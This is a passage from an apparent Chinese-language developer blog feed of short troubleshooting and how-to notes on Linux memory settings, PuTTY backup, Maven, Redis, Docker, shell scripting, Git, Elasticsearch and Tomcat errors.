<h3 id="overcommit-memory"><a href="#overcommit-memory" class="headerlink" title="overcommit_memory"></a>overcommit_memory</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">定義接受或拒絕大型記憶體需求的狀況。此參數有三種可用值：</span><br><span class="line">0 — 預設設定。kernel 會進行探索式的記憶體過度寫入處理，方法是預測記憶體的可用量、</span><br><span class="line">並讓公然違規的需求失敗。不幸的是，因為記憶體是以探索式、而非精準的演算法則來分配，</span><br><span class="line">因此這設定有時會過度使用系統上的可用記憶體。</span><br><span class="line"></span><br><span class="line">1 — kernel 不進行記憶體過度寫入處理。在此設定下，過度使用記憶體的機會會增加，但對於</span><br><span class="line">頻繁存取記憶體的任務來說，效能也會增加。</span><br><span class="line"></span><br><span class="line">2 — kernel 拒絕相等或大於總可用置換空間與實體記憶體比例（於 overcommit_ratio 指定）</span><br><span class="line">的記憶體需求。如果您想要降低記憶體過度寫入的風險，這是最佳設定。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>PuTTY備份</title>
    <url>/posts/1a2b64e5/</url>
    <content><![CDATA[<h3 id="PuTTY備份"><a href="#PuTTY備份" class="headerlink" title="PuTTY備份"></a>PuTTY備份</h3><span id="more"></span>
<p>PuTTY 是 SSH 與 Telnet 連線軟體，我們都會把常用的主機連線儲存在 PuTTY 裡面，方便快速連線，<br>但 PuTTY 並沒有提供匯出與匯入設定檔的功能，若遇到重灌或是更換電腦的情況，必須手動從 Windows 的「登錄編輯程式」匯出 PuTTY 的設定。</p>
<h3 id="備份-PuTTY-設定"><a href="#備份-PuTTY-設定" class="headerlink" title="備份 PuTTY 設定"></a>備份 PuTTY 設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">STEP 1:</span><br><span class="line">輸入「regedit」，開啟「登錄編輯程式」。</span><br><span class="line">STEP 2:</span><br><span class="line">選擇 HKEY_CURRENT_USER。</span><br><span class="line">STEP 3:</span><br><span class="line">選擇 Software。</span><br><span class="line">STEP 4:</span><br><span class="line">選擇 SimonTatham。</span><br><span class="line">STEP 5:</span><br><span class="line">選擇 SimonTatham 之後，點選「檔案」中的「匯出」，將裡面的設定備份出來。</span><br><span class="line">STEP 6:</span><br><span class="line">輸入欲匯出的檔案名稱，並選擇儲存檔案的目錄，然後按下「存檔」。</span><br><span class="line">這樣就完成 PuTTY 設定的匯出動作了，而該登錄檔中就包含了所有的 PuTTY 設定。</span><br></pre></td></tr></table></figure>

<h3 id="回復-PuTTY-設定"><a href="#回復-PuTTY-設定" class="headerlink" title="回復 PuTTY 設定"></a>回復 PuTTY 設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">若要在別台電腦匯入 PuTTY 的設定，可將剛匯出的登錄檔複製到新的電腦上，依照以下步驟會匯入。</span><br><span class="line">STEP 1:</span><br><span class="line">在該登錄檔按下右鍵，選擇「合併」。</span><br><span class="line">STEP 2:</span><br><span class="line">若合併來路不明的登錄檔，可能會造成問題，而我們是使用自己匯出的登錄檔。直接按下「是」即可執行登錄檔的合併。</span><br><span class="line">STEP 3:</span><br><span class="line">登錄成功之後，會出現成功的訊息。</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PuTTY</category>
      </categories>
      <tags>
        <tag>backup</tag>
      </tags>
  </entry>
  <entry>
    <title>org Apache Commons Exec ExecuteException Process Exited With An  Error Exit Value 1</title>
    <url>/posts/341444e5/</url>
    <content><![CDATA[<h3 id="How-to-solve-org-apache-commons-exec-ExecuteException-Process-exited-with-an-error-1-Exit-value-1"><a href="#How-to-solve-org-apache-commons-exec-ExecuteException-Process-exited-with-an-error-1-Exit-value-1" class="headerlink" title="How to solve org.apache.commons.exec.ExecuteException: Process exited with an error: 1 (Exit value: 1)"></a>How to solve org.apache.commons.exec.ExecuteException: Process exited with an error: 1 (Exit value: 1)</h3><span id="more"></span>
<p>這篇介紹How to solve org.apache.commons.exec.ExecuteException: Process exited with an error: 1 (Exit value: 1).</p>
<h3 id="會有錯誤的pom-xml"><a href="#會有錯誤的pom-xml" class="headerlink" title="會有錯誤的pom.xml"></a>會有錯誤的pom.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="line">	&lt;executions&gt;</span><br><span class="line">		&lt;execution&gt;</span><br><span class="line">			&lt;phase&gt;process-resources&lt;/phase&gt;</span><br><span class="line">			&lt;goals&gt;</span><br><span class="line">				&lt;goal&gt;<span class="built_in">exec</span>&lt;/goal&gt;</span><br><span class="line">			&lt;/goals&gt;</span><br><span class="line">		&lt;/execution&gt;</span><br><span class="line">	&lt;/executions&gt;</span><br><span class="line">	&lt;configuration&gt;</span><br><span class="line">		&lt;executable&gt;java&lt;/executable&gt;</span><br><span class="line">		&lt;arguments&gt;</span><br><span class="line">			&lt;argument&gt;<span class="variable">$&#123;jenkins.deploy.branch&#125;</span>&lt;/argument&gt;</span><br><span class="line">		&lt;/arguments&gt;</span><br><span class="line">		&lt;environmentVariables&gt;</span><br><span class="line">			&lt;LANG&gt;en_US&lt;/LANG&gt;</span><br><span class="line">		&lt;/environmentVariables&gt;</span><br><span class="line">	&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>

<h3 id="會有錯誤的pom-xml-1"><a href="#會有錯誤的pom-xml-1" class="headerlink" title="會有錯誤的pom.xml"></a>會有錯誤的pom.xml</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;exec-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="line">	&lt;configuration&gt;</span><br><span class="line">		&lt;executable&gt;java&lt;/executable&gt;</span><br><span class="line">		&lt;arguments&gt;</span><br><span class="line">			&lt;argument&gt;<span class="variable">$&#123;jenkins.deploy.branch&#125;</span>&lt;/argument&gt;</span><br><span class="line">		&lt;/arguments&gt;</span><br><span class="line">		&lt;environmentVariables&gt;</span><br><span class="line">			&lt;LANG&gt;en_US&lt;/LANG&gt;</span><br><span class="line">		&lt;/environmentVariables&gt;</span><br><span class="line">	&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br><span class="line"></span><br><span class="line">memo:將&lt;executions&gt;&lt;/executions&gt;移除</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pom</category>
      </categories>
      <tags>
        <tag>Pom</tag>
      </tags>
  </entry>
  <entry>
    <title>redisSentinel 參數調整</title>
    <url>/posts/8fad938a/</url>
    <content><![CDATA[<h3 id="redisSentinel參數調整"><a href="#redisSentinel參數調整" class="headerlink" title="redisSentinel參數調整"></a>redisSentinel參數調整</h3><span id="more"></span>
<p>這篇介紹redisSentinel參數調整。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">原本要建立專用redis publish/subscribe 的 Sentinel Server，</span><br><span class="line">用官方給的預設參數將建立redis連線上去後，連線是有建立起來，</span><br><span class="line">但使用Manager.get().getTopic(<span class="string">&quot;channel&quot;</span>).countSubscribers();</span><br><span class="line">發現publish/subscribe的數量皆為0，上去redis Sentinel用指令</span><br><span class="line">查詢也是0，看到初始參數有兩個預設參數:</span><br><span class="line"><span class="string">&quot;readMode&quot;</span>: <span class="string">&quot;SLAVE&quot;</span></span><br><span class="line"><span class="string">&quot;subscriptionMode&quot;</span>: <span class="string">&quot;SLAVE&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">將這兩個預設參數修改為:</span><br><span class="line"><span class="string">&quot;readMode&quot;</span>: <span class="string">&quot;MASTER&quot;</span></span><br><span class="line"><span class="string">&quot;subscriptionMode&quot;</span>: <span class="string">&quot;MASTER&quot;</span></span><br><span class="line">即可用程式碼或指令查詢到publish/subscribe的數量</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Rocky8 Install docker</title>
    <url>/posts/1d9d7152/</url>
    <content><![CDATA[<h3 id="Intro-Rocky8-Install-docker"><a href="#Intro-Rocky8-Install-docker" class="headerlink" title="Intro Rocky8 Install docker"></a>Intro Rocky8 Install docker</h3><span id="more"></span>
<p>這篇介紹Rocky8 Install docker。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">安裝所需套件及repository</span><br><span class="line">$ sudo yum install -y yum-utils</span><br><span class="line">$ sudo yum-config-manager \</span><br><span class="line">--add-repo \</span><br><span class="line">https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class="line"></span><br><span class="line">安裝docker 及docker compose</span><br><span class="line">$ sudo yum install docker-ce docker-ce-cli containerd.io --allowerasing</span><br><span class="line"></span><br><span class="line">啟動docker</span><br><span class="line">$ sudo systemctl start docker</span><br><span class="line">$ sudo systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
        <tag>Rocky8</tag>
      </tags>
  </entry>
  <entry>
    <title>ShellScript intro how to use for</title>
    <url>/posts/106019db/</url>
    <content><![CDATA[<h2 id="ShellScript-intro-how-to-use-for"><a href="#ShellScript-intro-how-to-use-for" class="headerlink" title="ShellScript intro how to use for"></a>ShellScript intro how to use for</h2><span id="more"></span>
<p>這篇主要介紹在ShellScripts上的指令for如何使用。</p>
<h2 id="for-1-100-不使用帶入參數"><a href="#for-1-100-不使用帶入參數" class="headerlink" title="for:1~100 不使用帶入參數:"></a>for:1~100 不使用帶入參數:</h2><p>for i in {1..100};<br>do<br>    echo $i;<br>done</p>
<h2 id="for-1-100-使用帶入參數"><a href="#for-1-100-使用帶入參數" class="headerlink" title="for:1~100 使用帶入參數:"></a>for:1~100 使用帶入參數:</h2><p>start&#x3D;1<br>end&#x3D;100<br>for i in $(seq $start $end);<br>do<br>    echo $i;<br>done</p>
<h2 id="for-1-100-使用帶入參數，另一種寫法"><a href="#for-1-100-使用帶入參數，另一種寫法" class="headerlink" title="for:1~100 使用帶入參數，另一種寫法:"></a>for:1~100 使用帶入參數，另一種寫法:</h2><p>start&#x3D;1<br>end&#x3D;100<br>for ((i&#x3D;$start; i&lt;&#x3D;$end; i++))<br>do<br>    echo $i;<br>done</p>
<h2 id="列出0-10偶數"><a href="#列出0-10偶數" class="headerlink" title="列出0~10偶數:"></a>列出0~10偶數:</h2><p>for i in {0..10..2}<br>do<br>    echo $i<br>done</p>
<p>Output:<br>印出 0 2 4 6 8 10</p>
<h2 id="列出1-10奇數"><a href="#列出1-10奇數" class="headerlink" title="列出1~10奇數:"></a>列出1~10奇數:</h2><p>for i in $(seq 1 2 10);<br>do<br>    echo $i;<br>done</p>
<p>Output:<br>印出 1 3 5 7 9</p>
]]></content>
      <categories>
        <category>ShellScript</category>
      </categories>
      <tags>
        <tag>Instruction</tag>
      </tags>
  </entry>
  <entry>
    <title>Intro reveal.js</title>
    <url>/posts/32e13d78/</url>
    <content><![CDATA[<h3 id="Intro-reveal-js"><a href="#Intro-reveal-js" class="headerlink" title="Intro reveal.js"></a>Intro reveal.js</h3><span id="more"></span>
<p>這篇介紹reveal.js，它是一個HTML的簡報框架且開源及免費。</p>
<h3 id="reveal-js"><a href="#reveal-js" class="headerlink" title="reveal.js"></a>reveal.js</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">reveal.js is an open <span class="built_in">source</span> HTML presentation framework.</span><br><span class="line">It enables anyone with a web browser to create fully featured and beautiful presentations <span class="keyword">for</span> free.</span><br><span class="line"></span><br><span class="line">Get Started:https://revealjs.com/installation/</span><br><span class="line"></span><br><span class="line">官方網站:https://revealjs.com/</span><br><span class="line">相關設定及操作都可在官方網站找到</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Presentation</tag>
      </tags>
  </entry>
  <entry>
    <title>ShellScript intro how to use if else fi</title>
    <url>/posts/b847805d/</url>
    <content><![CDATA[<h3 id="ShellScript-intro-how-to-use-if-else-fi"><a href="#ShellScript-intro-how-to-use-if-else-fi" class="headerlink" title="ShellScript intro how to use if else fi"></a>ShellScript intro how to use if else fi</h3><span id="more"></span>
<p>這篇主要介紹在ShellScripts上的指令if else fi如何使用。</p>
<h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;123&quot;</span> ] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 123&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="if-else-fi"><a href="#if-else-fi" class="headerlink" title="if else fi"></a>if else fi</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;123&quot;</span> ] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 123&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 456&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="if-else-elseif-fi"><a href="#if-else-elseif-fi" class="headerlink" title="if else elseif fi"></a>if else elseif fi</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;123&quot;</span> ] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 123&quot;</span></span><br><span class="line"><span class="keyword">elif</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;456&quot;</span> ] <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 456&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;var is 789&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h3 id="intruction"><a href="#intruction" class="headerlink" title="- intruction"></a>- intruction</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">-d file : 是目錄回傳 <span class="literal">true</span>.</span><br><span class="line">-f file : 是檔案回傳 <span class="literal">true</span>.</span><br><span class="line">-r file : 可讀回傳 <span class="literal">true</span>.</span><br><span class="line">-s file : 的體積大於 0 (不是空檔案) 回傳 <span class="literal">true</span>.</span><br><span class="line">-w file : 可寫入回傳 <span class="literal">true</span>.</span><br><span class="line">-x file : 可執行回傳 <span class="literal">true</span>.</span><br><span class="line">-n <span class="variable">$str</span> : 當 <span class="variable">$str1</span> 不是 null, 回傳 <span class="literal">true</span>.</span><br><span class="line">-z <span class="variable">$str</span> : 當 <span class="variable">$str1</span> 是 null, 回傳 <span class="literal">true</span>.</span><br></pre></td></tr></table></figure>

<h3 id="判斷指令"><a href="#判斷指令" class="headerlink" title="判斷指令"></a>判斷指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str1</span> = <span class="variable">$str2</span> : 判斷 <span class="variable">$str1</span> 與 <span class="variable">$str2</span> 字串是否相同。</span><br><span class="line"><span class="variable">$str1</span> != <span class="variable">$str2</span> : 判斷 <span class="variable">$str1</span> 與 <span class="variable">$str2</span> 字串是否不相同。</span><br><span class="line">var1 -eq var2 : var1 等於 var2 回傳 <span class="literal">true</span>.</span><br><span class="line">var1 -ne var2 : var1 不等於 var2 回傳 <span class="literal">true</span>.</span><br><span class="line">var1 -gt var2 : var1 大於 var2 回傳 <span class="literal">true</span>.</span><br><span class="line">var1 -ge var2 : var1 大於或等於 var2 回傳 <span class="literal">true</span>.</span><br><span class="line">var1 -lt var2 : var1 小於 var2 回傳 <span class="literal">true</span>.</span><br><span class="line">var1 -le var2 : var1 小於或等於 var2 回傳 <span class="literal">true</span>.</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ShellScript</category>
      </categories>
      <tags>
        <tag>Instruction</tag>
      </tags>
  </entry>
  <entry>
    <title>slf4j重複引用造成問題和Dependency Scopes</title>
    <url>/posts/8e9add41/</url>
    <content><![CDATA[<h3 id="slf4j重複引用造成問題和Dependency-Scopes"><a href="#slf4j重複引用造成問題和Dependency-Scopes" class="headerlink" title="slf4j重複引用造成問題和Dependency Scopes"></a>slf4j重複引用造成問題和Dependency Scopes</h3><span id="more"></span>
<p>這篇介紹slf4j重複引用造成問題和Dependency Scopes。</p>
<h3 id="遇到的問題"><a href="#遇到的問題" class="headerlink" title="遇到的問題"></a>遇到的問題</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">org.slf4j在Maven已定義一個，但另外引用的jar底下也有使用不同版本的org.slf4j</span><br><span class="line">造成有時<span class="built_in">log</span>都寫到catalina.out (看引用的順序決定</span><br></pre></td></tr></table></figure>

<h3 id="解決辦法"><a href="#解決辦法" class="headerlink" title="解決辦法"></a>解決辦法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">保留原本org.slf4j在Maven的定義</span><br><span class="line">在pom.xml多使用</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.21&lt;/version&gt;</span><br><span class="line">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">並將scope指定成provided</span><br></pre></td></tr></table></figure>

<h3 id="Dependency-Scopes"><a href="#Dependency-Scopes" class="headerlink" title="Dependency Scopes"></a>Dependency Scopes</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1、 compile  (編譯)</span><br><span class="line">此為預設值，表示此jar是所有階段需要的。 部署時將一起被打包到jar/war裡面。</span><br><span class="line"></span><br><span class="line">2、 <span class="built_in">test</span> (測試)</span><br><span class="line">表示此jar檔只有在測試時，才需要使用。如 junit jar 等。</span><br><span class="line">部署時將不會打包到jar/war裡面。</span><br><span class="line"></span><br><span class="line">3、 runtime (運行)</span><br><span class="line">表示此jar檔只有在運行時，才需要使用。如jdbc jar等。</span><br><span class="line"></span><br><span class="line">4、 provided (已提供)</span><br><span class="line">當運行時，表示此jar檔期望由JDK、Tomcat及jboss等來提供。如 servlet.jar、jsp-api.jar 等。</span><br><span class="line">部署時將不會打包到jar/war裡面。</span><br><span class="line"></span><br><span class="line">5、 system (系統)</span><br><span class="line">表示此jar檔有系統提供。跟provided 相似，這是以外部JAR檔的形式提供。</span><br><span class="line">而在maven repository 是無法找到它的。</span><br><span class="line">需指定位置，配合 systemPath 來使用。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>slf4j</category>
      </categories>
      <tags>
        <tag>slf4j</tag>
      </tags>
  </entry>
  <entry>
    <title>Use SourceTree Clone Repository Error</title>
    <url>/posts/47c160b/</url>
    <content><![CDATA[<h3 id="Intro-Use-SourceTree-Clone-Repository-Error"><a href="#Intro-Use-SourceTree-Clone-Repository-Error" class="headerlink" title="Intro Use SourceTree Clone Repository Error"></a>Intro Use SourceTree Clone Repository Error</h3><span id="more"></span>
<p>這篇介紹Use SourceTree Clone Repository Error。</p>
<h3 id="Error-message"><a href="#Error-message" class="headerlink" title="Error message"></a>Error message</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用SourceTree將.git <span class="built_in">clone</span>下來時出現</span><br><span class="line">Error: remote: Repository not found. 錯誤訊息。</span><br></pre></td></tr></table></figure>

<h3 id="解決方式"><a href="#解決方式" class="headerlink" title="解決方式"></a>解決方式</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">原連結 : https://github.com/&#123;Name&#125;/&#123;Repository&#125;.git</span><br><span class="line">修改成</span><br><span class="line">https://&#123;userName&#125;:&#123;Personal access tokens&#125;github.com/&#123;Name&#125;/&#123;Repository&#125;.git</span><br></pre></td></tr></table></figure>

<h3 id="How-to-generate-Personal-access-tokens"><a href="#How-to-generate-Personal-access-tokens" class="headerlink" title="How to generate Personal access tokens"></a>How to generate Personal access tokens</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Signed <span class="keyword">in</span> GitHub</span><br><span class="line">Settings -&gt; Developer settings -&gt; Personal access tokens -&gt; Generate new token</span><br><span class="line">Note : key name</span><br><span class="line">打勾write:packages</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>GitHub</category>
      </categories>
      <tags>
        <tag>GitHub</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>How to solve ssh: Could not resolve hostname : Name or service not known</title>
    <url>/posts/f461456d/</url>
    <content><![CDATA[<h2 id="How-to-solve-ssh-Could-not-resolve-hostname-Name-or-service-not-known"><a href="#How-to-solve-ssh-Could-not-resolve-hostname-Name-or-service-not-known" class="headerlink" title="How to solve ssh: Could not resolve hostname : Name or service not known"></a>How to solve ssh: Could not resolve hostname : Name or service not known</h2><span id="more"></span>
<p>這篇介紹How to solve ssh: Could not resolve hostname : Name or service not known。</p>
<h2 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法:"></a>解決方法:</h2><p>將local IP和hostname加到&#x2F;etc&#x2F;hosts即可使用ssh hostname指令<br>$vim &#x2F;etc&#x2F;hosts<br>$source &#x2F;etc&#x2F;hosts<br>$ssh -p 12345 hostname</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>hostname</tag>
      </tags>
  </entry>
  <entry>
    <title>version conflict engine exception</title>
    <url>/posts/471f9bc3/</url>
    <content><![CDATA[<h3 id="How-to-solve-type-x3D-version-conflict-engine-exception"><a href="#How-to-solve-type-x3D-version-conflict-engine-exception" class="headerlink" title="How to solve type&#x3D;version_conflict_engine_exception"></a>How to solve type&#x3D;version_conflict_engine_exception</h3><span id="more"></span>
<p>這篇介紹為什麼會發生type&#x3D;version_conflict_engine_exception並提出解決方法。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">當兩個Process對同一個index、_id進行update時，就會有先後順序的Conflict問題發生。</span><br><span class="line">因update先後順序不重要，且確保兩句update都要執行時，可以設定retry_on_conflict參數來達到重試。</span><br><span class="line"></span><br><span class="line">retry_on_conflict default 為 0</span><br></pre></td></tr></table></figure>

<h3 id="KQL-example"><a href="#KQL-example" class="headerlink" title="KQL example"></a>KQL example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">POST /website/pageviews/1/_update?retry_on_conflict=5 </span><br><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;script&quot;</span> : <span class="string">&quot;ctx._source.views+=1&quot;</span>,</span><br><span class="line">   <span class="string">&quot;upsert&quot;</span>: &#123;</span><br><span class="line">       <span class="string">&quot;views&quot;</span>: 0</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="REST-API-example"><a href="#REST-API-example" class="headerlink" title="REST API example"></a>REST API example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">UpdateRequest request = new UpdateRequest(indexName, documentId).doc(params);</span><br><span class="line">request.retryOnConflict(5);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
      </tags>
  </entry>
  <entry>
    <title>How to Use Composite Aggregation to do BucketSort</title>
    <url>/posts/6753181c/</url>
    <content><![CDATA[<h3 id="How-to-Use-Composite-Aggregation-to-do-BucketSort"><a href="#How-to-Use-Composite-Aggregation-to-do-BucketSort" class="headerlink" title="How to Use Composite Aggregation to do BucketSort"></a>How to Use Composite Aggregation to do BucketSort</h3><span id="more"></span>
<p>這篇介紹How to Use Composite Aggregation to do BucketSort。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">SearchSourceBuilder sourceBuilder = new SearchSourceBuilder();</span><br><span class="line"></span><br><span class="line">List&lt;CompositeValuesSourceBuilder&lt;?&gt;&gt; sources = new ArrayList&lt;&gt;();</span><br><span class="line">sources.add(new TermsValuesSourceBuilder(<span class="string">&quot;employee&quot;</span>).field(<span class="string">&quot;employee&quot;</span>).missingBucket(<span class="literal">true</span>)</span><br><span class="line">	.order(SortOrder.ASC));</span><br><span class="line"></span><br><span class="line">CompositeAggregationBuilder composite = new CompositeAggregationBuilder(<span class="string">&quot;my_bucket&quot;</span>, sources);</span><br><span class="line">composite.subAggregation(AggregationBuilders.<span class="built_in">sum</span>(<span class="string">&quot;salary&quot;</span>).field(<span class="string">&quot;salary&quot;</span>));</span><br><span class="line"></span><br><span class="line">sourceBuilder.query(queryBuilder);</span><br><span class="line">sourceBuilder.fetchSource(<span class="literal">false</span>);</span><br><span class="line">sourceBuilder.aggregation(composite);</span><br><span class="line">sourceBuilder.size(0);</span><br><span class="line"></span><br><span class="line">FieldSortBuilder salarySort = new FieldSortBuilder(<span class="string">&quot;salary&quot;</span>).order(SortOrder.DESC);</span><br><span class="line">List&lt;FieldSortBuilder&gt; sortList = new ArrayList&lt;&gt;();</span><br><span class="line">sortList.add(salarySort);</span><br><span class="line">BucketSortPipelineAggregationBuilder bucketsort = new BucketSortPipelineAggregationBuilder(</span><br><span class="line">	<span class="string">&quot;salarySortAggs&quot;</span>, sortList).from(0).size(10);</span><br><span class="line">composite.subAggregation(bucketsort);</span><br><span class="line"></span><br><span class="line">String[] indices = ElasticSearchUtils.timeRangeToIndexesDay(INDEX_NAME_PREFIX);</span><br><span class="line">SearchResponse searchResponse = ELKManager.search(sourceBuilder, indices);</span><br></pre></td></tr></table></figure>

<h3 id="Example說明"><a href="#Example說明" class="headerlink" title="Example說明"></a>Example說明</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">針對INDEX_NAME_PREFIX裡的employee欄位做group by後</span><br><span class="line">將salary欄位做<span class="built_in">sum</span>計算，取出的bucket再做order by <span class="built_in">sum</span>(salary)</span><br><span class="line">即可取出這張表薪水前10的員工功能</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ElasticSearch</category>
      </categories>
      <tags>
        <tag>ElasticSearch</tag>
        <tag>CompositeAggregation</tag>
        <tag>FieldSortBuilder</tag>
        <tag>BucketSortPipelineAggregationBuilder</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat Error:A child container failed during start</title>
    <url>/posts/256138d5/</url>
    <content><![CDATA[<h3 id="Tomcat-Error-A-child-container-failed-during-start"><a href="#Tomcat-Error-A-child-container-failed-during-start" class="headerlink" title="Tomcat Error:A child container failed during start"></a>Tomcat Error:A child container failed during start</h3><span id="more"></span>
<p>這篇介紹Tomcat Error:A child container failed during start。</p>
<h3 id="Error-Message"><a href="#Error-Message" class="headerlink" title="Error Message"></a>Error Message</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">严重: A child container failed during start</span><br><span class="line"></span><br><span class="line">java.util.concurrent.ExecutionException: org.apache.catalina.LifecycleException:  </span><br><span class="line"></span><br><span class="line">Failed to start component [StandardEngine[Catalina].StandardHost[localhost]. </span><br><span class="line"></span><br><span class="line">StandardContext[/patyee]]</span><br><span class="line"></span><br><span class="line">    at java.util.concurrent.FutureTask.report(FutureTask.java:122)</span><br><span class="line"></span><br><span class="line">    at java.util.concurrent.FutureTask.get(FutureTask.java:192)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)</span><br><span class="line"></span><br><span class="line">    at java.util.concurrent.ThreadPoolExecutor<span class="variable">$Worker</span>.run(ThreadPoolExecutor.java:617)</span><br><span class="line"></span><br><span class="line">    at java.lang.Thread.run(Thread.java:745)</span><br><span class="line"></span><br><span class="line">Caused by: org.apache.catalina.LifecycleException: Failed to start component</span><br><span class="line"></span><br><span class="line"> [StandardEngine[Catalina].StandardHost[localhost].StandardContext[/patyee]]</span><br><span class="line"></span><br><span class="line">    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:154)</span><br><span class="line"></span><br><span class="line">    ... 6 more</span><br></pre></td></tr></table></figure>

